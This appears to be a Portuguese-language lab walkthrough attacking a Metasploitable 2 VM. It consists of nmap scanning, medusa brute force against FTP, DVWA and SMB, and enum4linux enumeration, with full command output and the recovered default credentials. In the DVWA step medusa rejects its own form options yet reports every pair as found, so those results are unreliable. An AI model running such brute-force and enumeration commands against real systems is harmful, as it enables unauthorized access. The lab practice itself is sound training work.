## Ferramentas usadas: medusa, nmap, enum4linux, smbclient, ftp.
Primeiramente comecei usando o nmap para verificar qual era o IP do metasploitable 2:
```console
$ nmap -v 192.168.0.1/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 14:32 EDT
Initiating ARP Ping Scan at 14:32
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 14:32, 2.91s elapsed (255 total hosts)
Initiating Parallel DNS resolution of 5 hosts. at 14:32
Completed Parallel DNS resolution of 5 hosts. at 14:32, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:32
Completed Parallel DNS resolution of 1 host. at 14:32, 0.00s elapsed
Initiating SYN Stealth Scan at 14:32
Scanning 5 hosts [1000 ports/host]
Discovered open port 5900/tcp on 192.168.0.104
Discovered open port 139/tcp on 192.168.0.104
Discovered open port 21/tcp on 192.168.0.104
Discovered open port 111/tcp on 192.168.0.104
Discovered open port 23/tcp on 192.168.0.104
Discovered open port 445/tcp on 192.168.0.104
Discovered open port 3306/tcp on 192.168.0.104
Discovered open port 80/tcp on 192.168.0.104
Discovered open port 25/tcp on 192.168.0.104
Discovered open port 53/tcp on 192.168.0.104
Discovered open port 22/tcp on 192.168.0.104
Discovered open port 2121/tcp on 192.168.0.104
Discovered open port 6667/tcp on 192.168.0.104
Discovered open port 5432/tcp on 192.168.0.104
Discovered open port 1524/tcp on 192.168.0.104
Discovered open port 513/tcp on 192.168.0.104
Discovered open port 1099/tcp on 192.168.0.104
Discovered open port 8180/tcp on 192.168.0.104
Discovered open port 2049/tcp on 192.168.0.104
Discovered open port 514/tcp on 192.168.0.104
Discovered open port 512/tcp on 192.168.0.104
Discovered open port 6000/tcp on 192.168.0.104
Discovered open port 8009/tcp on 192.168.0.104
^C
```
Logo após isso usei o medusa para testar os usuários:
```console
$ medusa -h 192.168.0.104 -U ftp_user.dat -P ftp_pass.dat -M ftp -t 6              
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: admin (1 of 2, 1 complete) Password: 1234 (1 of 4 complete)
2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: admin (1 of 2, 1 complete) Password: password (2 of 4 complete)
2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: admin (1 of 2, 1 complete) Password: msfadmin (3 of 4 complete)
2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: admin (1 of 2, 2 complete) Password: admin (4 of 4 complete)
2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 2, 2 complete) Password: password (1 of 4 complete)
2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 2, 2 complete) Password: msfadmin (2 of 4 complete)
2025-10-15 14:36:56 ACCOUNT FOUND: [ftp] Host: 192.168.0.104 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-15 14:36:56 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 2, 3 complete) Password: 1234 (3 of 4 complete)
2025-10-15 14:36:58 ACCOUNT CHECK: [ftp] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 2, 3 complete) Password: admin (4 of 4 complete)                                                     
```
Com o usuário e a senha em mãos fui ao console do ftp e tentei em conectar com as credenciais:
```console
$ ftp 192.168.0.104                    
Connected to 192.168.0.104.
220 (vsFTPd 2.3.4)
Name (192.168.0.104:user): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||55442|).
150 Here comes the directory listing.
drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable
226 Directory send OK.
```
Após essa etapa decidi reciclar as wordlists do ftp no fomulário http do dvwa(decidi diminuir as threads para ver se achava as credenciais mais facilmente):
```console
$ medusa -h 192.168.0.104 -U ftp_user.dat -P ftp_pass.dat -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 2
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
2025-10-15 14:38:58 ACCOUNT CHECK: [http] Host: 192.168.0.104 (1 of 1, 0 complete) User: admin (1 of 2, 0 complete) Password: password (1 of 4 complete)
2025-10-15 14:38:58 ACCOUNT FOUND: [http] Host: 192.168.0.104 User: admin Password: password [SUCCESS]
2025-10-15 14:38:58 ACCOUNT CHECK: [http] Host: 192.168.0.104 (1 of 1, 0 complete) User: admin (1 of 2, 1 complete) Password: 1234 (2 of 4 complete)
2025-10-15 14:38:58 ACCOUNT FOUND: [http] Host: 192.168.0.104 User: admin Password: 1234 [SUCCESS]
2025-10-15 14:38:58 ACCOUNT CHECK: [http] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 2, 2 complete) Password: 1234 (1 of 4 complete)
2025-10-15 14:38:58 ACCOUNT FOUND: [http] Host: 192.168.0.104 User: msfadmin Password: 1234 [SUCCESS]
2025-10-15 14:38:58 ACCOUNT CHECK: [http] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 2, 3 complete) Password: password (2 of 4 complete)
2025-10-15 14:38:58 ACCOUNT FOUND: [http] Host: 192.168.0.104 User: msfadmin Password: password [SUCCESS]
```
Depois de conseguir logar no formulário com sucesso, usando as primeiras credenciais, fui para a última tarefa:
```console
enum4linux -a 192.168.0.104   
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 15 14:40:25 2025

 =========================================( Target Information )=========================================                                                                                 
                                                                                             
Target ........... 192.168.0.104                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.104 )===========================                                                                                  
                                                                                             
                                                                                             
[+] Got domain/workgroup name: WORKGROUP                                                     
                                                                                             
                                                                                             
 ===============================( Nbtstat Information for 192.168.0.104 )===============================                                                                                  
                                                                                             
Looking up status of 192.168.0.104                                                           
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.0.104 )===================================                                                                                 
                                                                                             
                                                                                             
[+] Server 192.168.0.104 allows sessions using username '', password ''                      
                                                                                             
                                                                                             
 ================================( Getting domain SID for 192.168.0.104 )================================                                                                                 
                                                                                             
Domain Name: WORKGROUP                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                         
                                                                                             
                                                                                             
 ==================================( OS information on 192.168.0.104 )==================================                                                                                  
                                                                                             
                                                                                             
[E] Can't get OS info with smbclient                                                         
                                                                                             
                                                                                             
[+] Got OS info for 192.168.0.104 from srvinfo:                                              
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)      
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 =======================================( Users on 192.168.0.104 )=======================================                                                                                 
                                                                                             
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)         
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,   Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)     Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =================================( Share Enumeration on 192.168.0.104 )=================================                                                                                 
                                                                                             
                                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.0.104                                                
                                                                                             
//192.168.0.104/print$  Mapping: DENIED Listing: N/A Writing: N/A                            
//192.168.0.104/tmp     Mapping: OK Listing: OK Writing: N/A
//192.168.0.104/opt     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                               
                                                                                             
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                                   
//192.168.0.104/IPC$    Mapping: N/A Listing: N/A Writing: N/A
//192.168.0.104/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.0.104 )===========================                                                                                  
                                                                                             
                                                                                             

[+] Attaching to 192.168.0.104 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                         
                                                                                             
                                                                                             
Password Complexity: Disabled                                                                
Minimum Password Length: 0


 ======================================( Groups on 192.168.0.104 )======================================                                                                                  
                                                                                             
                                                                                             
[+] Getting builtin groups:                                                                  
                                                                                             
                                                                                             
[+]  Getting builtin group memberships:                                                      
                                                                                             
                                                                                             
[+]  Getting local groups:                                                                   
                                                                                             
                                                                                             
[+]  Getting local group memberships:                                                        
                                                                                             
                                                                                             
[+]  Getting domain groups:                                                                  
                                                                                             
                                                                                             
[+]  Getting domain group memberships:                                                       
                                                                                             
                                                                                             
 ==================( Users on 192.168.0.104 via RID cycling (RIDS: 500-550,1000-1050) )==================                                                                                 
                                                                                             
                                                                                             
[I] Found new SID:                                                                           
S-1-5-21-1042354039-2475377354-766472396                                                     

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                                                                               
                                                                                             
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)       
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)                                                                                                                                                               
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)                                                                                                                                                              
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)                                                                                                                                                               
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)                                                                                                                                                            
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)                                                                                                                                                                
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)                                                                                                                                                              
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)                                                                                                                                                              
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)                                                                                                                                                            
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)                                                                                                                                                              
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)                                                                                                                                                            
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)                                                                                                                                                              
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)                                                                                                                                                            
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)                                                                                                                                                           
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)                                                                                                                                                            
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)                                                                                                                                                         
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)                                                                                                                                                             
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)                                                                                                                                                           
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

 ===============================( Getting printer info for 192.168.0.104 )===============================
                                                                                                                                                                                                                                            
No printers returned.                                                                                                                                                                                                                       


enum4linux complete on Wed Oct 15 14:42:32 2025
```
Usei de brute force para conseguir as últimas credenciais:
```console
$ medusa -h 192.168.0.104 -U smb_users.txt -P smb_passwords.txt -M smbnt -t 6 -T 10 
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: root (1 of 3, 1 complete) Password: password (1 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: root (1 of 3, 1 complete) Password: 1234 (2 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: letmein (2 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: root (1 of 3, 2 complete) Password: msfadmin (3 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: root (1 of 3, 2 complete) Password: letmein (4 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: 1234 (3 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
2025-10-15 14:46:07 ACCOUNT FOUND: [smbnt] Host: 192.168.0.104 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: nobody (3 of 3, 4 complete) Password: msfadmin (1 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: nobody (3 of 3, 4 complete) Password: 1234 (2 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: nobody (3 of 3, 4 complete) Password: password (3 of 4 complete)
2025-10-15 14:46:07 ACCOUNT CHECK: [smbnt] Host: 192.168.0.104 (1 of 1, 0 complete) User: nobody (3 of 3, 4 complete) Password: letmein (4 of 4 complete)
```
E finalmente testei se as mesmas eram validas com smbclient:
```console
$ smbclient -L 192.168.0.104 -U msfadmin --password msfadmin                       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
```
